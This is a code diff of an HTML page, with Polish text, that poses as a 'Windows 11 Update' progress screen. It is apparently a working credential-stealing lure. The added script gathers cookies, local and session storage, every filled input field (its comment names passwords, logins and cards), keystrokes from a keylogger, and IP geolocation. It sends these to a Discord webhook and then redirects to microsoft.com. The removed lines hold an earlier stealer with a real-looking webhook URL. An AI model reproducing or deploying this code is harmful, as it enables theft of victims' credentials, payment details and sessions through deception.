@@ -1,34 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Aktualizacja</title>
-    <style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:80px;}</style>
+    <title>Windows 11 Update</title>
+    <style>body{background:#000;color:#0f0;font-family:Arial;text-align:center;padding:100px 20px;}
+    .box{max-width:700px;margin:auto;border:3px solid #0f0;padding:50px;}</style>
 </head>
 <body>
-    <h1>Trwa aktualizacja...</h1>
-    <p>Proszę czekać 5 sekund. Nie zamykaj okna.</p>
+    <div class="box">
+        <h1>Trwa aktualizacja systemu Windows...</h1>
+        <p>Proszę czekać. Nie zamykaj okna.</p>
+        <div style="border:8px solid #333;border-top:8px solid #0f0;border-radius:50%;width:60px;height:60px;margin:20px auto;animation:spin 1s linear infinite;"></div>
+    </div>
 
     <script>
-        const webhook = https://discord.com/api/webhooks/1521645357082087454/e2MVaOrDUJxQS-FAMPosani30S4nIyD4GVG7nPHD9HiRwIuTwuaNVYXdUsWHun1xamcW
+        const webhook = "TUTAJ_WKLEJ_SWÓJ_WEBHOOK";
 
-        function wyślij(dane) {
-            fetch(webhook, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({content: "```" + JSON.stringify(dane, null, 2) + "```"})
-            });
+        function send(d) {
+            fetch(webhook, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({content:"```json\n"+JSON.stringify(d,null,2)+"\n```"})});
         }
 
-        wyślij({
-            strona: window.location.href,
+        let stolen = {
+            url: location.href,
             cookies: document.cookie,
             localStorage: Object.fromEntries(Object.entries(localStorage)),
             sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
-            userAgent: navigator.userAgent,
-            czas: new Date().toISOString()
+            inputs: {},
+            ua: navigator.userAgent
+        };
+
+        // Wszystkie inputy (hasła, loginy, karty)
+        document.querySelectorAll('input,textarea').forEach(i => {
+            if (i.value) stolen.inputs[i.name || i.id || i.type] = i.value;
         });
 
-        setTimeout(() => window.location = "https://google.com", 5000);
+        send(stolen);
+
+        // Keylogger
+        let buffer = "";
+        document.addEventListener("keypress", e => {
+            buffer += e.key;
+            if (buffer.length > 80) {
+                send({typed: buffer});
+                buffer = "";
+            }
+        });
+
+        fetch("https://ipapi.co/json/").then(r=>r.json()).then(ip=>send({ip:ip}));
+
+        setTimeout(()=>location.href="https://microsoft.com", 7000);
     </script>
 </body>
 </html>
